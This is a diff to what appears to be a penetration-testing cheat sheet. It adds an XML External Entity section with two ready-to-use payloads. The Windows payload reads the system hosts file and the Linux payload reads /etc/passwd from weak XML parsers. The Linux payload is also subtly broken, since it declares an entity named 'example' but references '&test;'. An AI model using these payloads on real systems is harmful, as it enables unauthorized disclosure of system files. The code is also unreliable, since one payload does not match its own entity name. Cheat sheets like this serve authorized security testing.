@@ -186,7 +186,24 @@ directory-list-lowercase-2.3-medium.txt
 
 <br />
 
+### XXE - XML External Entity
 
+<br />
+
+```bash
+# About: Try against weak XML parsers
+
+
+# Usage Windows
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
+<data>&test;</data>
+
+# Usage Linux
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&test;</data>
+```
+
+<br />
 
 ## Kerberos [88] 
 
